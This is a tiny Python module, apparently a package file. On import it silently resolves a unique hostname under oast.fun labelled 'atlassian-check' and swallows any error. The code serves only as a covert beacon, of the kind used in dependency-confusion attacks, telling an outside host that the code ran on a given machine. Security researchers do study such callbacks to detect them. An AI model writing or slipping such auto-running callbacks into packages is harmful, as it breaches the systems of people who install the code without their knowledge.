import socket

def _check():
    try:
        
        dns = "atlassian-check.jtjfltlbcawisjpxgctzcxl6u1v914uad.oast.fun"
        
        
        socket.gethostbyname(dns)
    except:
        pass


_check()